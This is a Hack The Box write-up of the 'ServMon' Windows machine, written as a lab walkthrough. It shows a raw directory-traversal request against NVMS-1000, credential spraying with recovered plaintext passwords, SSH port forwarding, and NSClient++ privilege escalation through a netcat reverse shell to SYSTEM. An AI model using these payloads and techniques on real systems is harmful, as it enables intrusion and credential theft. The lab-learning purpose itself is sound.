---
layout: post
title: "Hack The Box - ServMon Writeup"
author: Chr0x6eOs
date: "2020-06-20"
subject: "ServMon Writeup"
keywords: [HTB, CTF, Hack The Box, Security, Chr0x6eOs, Windows, Directory Traversal, NSClient++, Port Tunneling, Port Forwarding]
lang: "en"
image:
    path: assets/htb/ServMon/logo.png
    width: 300
    height: 300
...

# Overview
![ServMon Image](/assets/htb/ServMon/servmon.png)

[ServMon](https://www.hackthebox.eu/home/machines/profile/240) is an easy windows box by [dmw0ng](https://www.hackthebox.eu/home/users/profile/82600).


The box starts with ftp-enumeration, which reveals that passwords are stored in a txt-file on the desktop of one of the users. Enumerating http, we see that NVMS-1000 is running. The application is vulnerable to directory traversal, which can be used to read the mentioned password-file. One of the found passwords works with SSH and we can read user.txt.

In order to get system we exploit a vulnerability in NSClient++, which allows us to run arbitrary commands in the context of nt authority\system.

# Information Gathering

## Nmap

We begin our enumeration with a nmap scan for open ports. 

```bash
root@darkness:~# nmap -sC -sV 10.10.10.184
Nmap scan report for 10.10.10.184
Host is up (0.049s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst:
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp   open  http
| fingerprint-strings:
|   GetRequest, HTTPOptions, RTSPRequest:
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo:
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  tcpwrapped
8443/tcp open  ssl/https-alt
| fingerprint-strings:
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest:
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|_    68.0
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
```

# Enumeration
The are a lot of open ports, however the most interesting are **21**, **22**, **80**, **445** and **8443**. SSH not that common with windows and is definitely worth keeping in mind.

## FTP - Port 21
Nmap already told us that anonymous FTP-login is available, so let us try this:
```bash
root@darkness:~# ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:root): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.

ftp> dir
01-18-20  12:05PM       <DIR>          Users
ftp> cd Users
01-18-20  12:06PM       <DIR>          Nadine
01-18-20  12:08PM       <DIR>          Nathan
ftp> cd Nathan
01-18-20  12:10PM                  186 Notes to do.txt
ftp> get 'Notes to do.txt'
ftp> cd ../Nadine
01-18-20  12:08PM                  174 Confidential.txt
ftp> get Confidential.txt
```
Looking at FTP we get usernames and two interesting files.

```bash
root@darkness:~# cat Confidential.txt
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards
Nadine
```

Seems like there are passwords saved in a txt file on the desktop of Nathan. Let us keep this in mind, in case we get file-read on the server.

```bash
root@darkness:~# cat 'Notes to do.txt'
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

## HTTP - Port 80

Going to http://10.10.10.184 we get redirected to a login panel.

![Login panel](/assets/htb/ServMon/webpage-index.png)

This seems to be running `NVMS-1000`. Let us use searchsploit to see if we find any exploit for it.

```bash
root@darkness:~# searchsploit 'NVMS 1000'
----------------------------------------------------------- ----------------------------------------
 Exploit Title                                             |  Path
                                                           | (/usr/share/exploitdb/)
----------------------------------------------------------- ----------------------------------------
NVMS 1000 - Directory Traversal                            | exploits/hardware/webapps/47774.txt
----------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```
Searchsploit returns us a [directory traversal vulnerability](https://www.exploit-db.com/exploits/47774). The POC shows that if vulnerable, the application is prone to arbitrary file-read!

### Exploiting Directory Traversal in NVMS-1000
Let us first verify if the target is vulnerable by reading `win.ini`. Using Burp repeater we can send requests like this easily.

```http
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 10.10.10.184
Accept: text/html
Connection: close
```
Sending a request like this should give us win.ini, if the target is vulnerable.

```http
HTTP/1.1 200 OK
Content-type:
Content-Length: 92
Connection: close
AuthInfo:

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
Seems like the target is vulnerable and with the Passwords.txt file still in mind, let us try to retrieve that file from Nathans desktop.

We can now change the request in the repeater tab to read Passwords.txt from Nathans desktop instead.

![Burp repeater view](/assets/htb/ServMon/burp-dirtraversal.png)

Let us save the retrieved passwords to a file for later usage.

### Getting user shell
Using crackmapexec we can easily test large sets of possible credentials.
```bash
root@darkness:~# crackmapexec smb 10.10.10.184 -u Nadine -p pws.txt
SMB         10.10.10.184    445    SERVMON      [*] Windows 10.0 Build 18362 x64
SMB         10.10.10.184    445    SERVMON      [-] SERVMON\Nadine:1nsp3ctTh3Way2Mars!
SMB         10.10.10.184    445    SERVMON      [-] SERVMON\Nadine:Th3r34r3To0M4nyTrait0r5!
SMB         10.10.10.184    445    SERVMON      [-] SERVMON\Nadine:B3WithM30r4ga1n5tMe
SMB         10.10.10.184    445    SERVMON      [+] SERVMON\Nadine:L1k3B1gBut7s@W0rk
```
Seems like Nadine can login to the system with the password `L1k3B1gBut7s@W0rk`! After trying to list SMB-shares and logging in using winrm without any success, I remembered that SSH was open.

```powershell
root@darkness:~# ssh nadine@10.10.10.184
nadine@10.10.10.184 password: L1k3B1gBut7s@W0rk
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>
```
We can login as Nadine with the found password via SSH and read user.txt.
```powershell
nadine@SERVMON C:\Users\Nadine>type Desktop\user.txt
1e8b6***************************
```

# Privesc to system
Now that we are user, let us enumerate the system and find a privilege escalation vector to system.

## Enumerating Port 8443

We have not checked out port 8443 yet, so let us see if there is anything interesting listening. After connecting to https://10.10.10.184:8443, we see that NSClient++ web-GUI is running.

![NSClient ++ Web-GUI](/assets/htb/ServMon/nsclient-index.png)

Using searchsploit again, we can find a possible [privilege escalation attack-vector](https://www.exploit-db.com/exploits/46802).

```bash
root@darkness:~# searchsploit 'NSClient++'
----------------------------------------------------------- ----------------------------------------
 Exploit Title                                             |  Path
                                                           | (/usr/share/exploitdb/)
----------------------------------------------------------- ----------------------------------------
NSClient++ 0.5.2.35 - Privilege Escalation                 | exploits/windows/local/46802.txt
----------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```
The exploit requires credentials. Luckily, they are stored in plaintext in the config file, which we have access to.

```powershell
nadine@SERVMON C:\Users\Nadine>type 'C:\Program Files\NSClient++\nsclient.ini'
# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1
```
Besides the password, the configuration file also tells us that connections are only permitted from `127.0.0.1`. This is also stated in the `Notes to do.txt` : `"2) Lock down the NSClient Access – Complete"`.

![Login not allowed](/assets/htb/ServMon/nsclient-login-403.png)

A quick login attempt verifies that only connections from localhost are allowed.

### Bypassing access-restriction with port forwarding
Luckily, we have SSH enabled, which makes port forwarding really easy. This should let us bypass the localhost-only restriction and we should still be able to exploit the application. 
```bash
root@darkness:~# ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443
nadine@10.10.10.184 password: L1k3B1gBut7s@W0rk
```
We can verify if the port forward is running by checking the listening ports on our machine.
```bash
root@darkness:~# ss -alnp | grep 8443
tcp   LISTEN 0     128     127.0.0.1:8443     0.0.0.0:*      users:(("ssh",pid=12778,fd=5))
```
With the SSH tunnel setup, we can now access to the website successfully via our localhost.

### Exploiting NSClient++

In order to exploit NSClient++, we need to go to the settings tab and create a new script, which runs our malicious payload. Then we can use the web-console to trigger the script and get code-execution in the context of nt authority\system.

![Exploiting NSClient - Part 1](/assets/htb/ServMon/nsclient-exploit-1.png)

First we have to go to the settings tab of NSClient++, in order to create a new script.

![Exploiting NSClient - Part 2](/assets/htb/ServMon/nsclient-exploit-2.png)

Under `external scripts > scripts > Add a simple script` we can add a new script.

![Exploiting NSClient - Part 3](/assets/htb/ServMon/nsclient-exploit-3.png)

We create a new script that executes nc.exe (which can be uploaded using scp or directly from our smb-share) and returns a reverse-shell to our machine.

The exploit states that the system requires a reboot in order to trigger the exploit, however during digging around the web-console, I found that it is possible to execute the script directly from the web-console.

![Triggering exploit](/assets/htb/ServMon/nsclient-exploit-trigger.png)

By typing the alias of the script into the web-console we can execute the payload manually.

![Exploit executing](/assets/htb/ServMon/nsclient-exploit-executing.png)

The payload is being executed and we get a response on our netcat listener.

```bash
root@darkness:~# rlwrap nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.184.
Ncat: Connection from 10.10.10.184:52351.
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
nt authority\system
```
With the exploit successfully executed we get a reverse-shell as nt authority\system and can read root.txt.
```powershell
C:\Program Files\NSClient++>type C:\Users\Administrator\Desktop\root.txt
86637***************************
```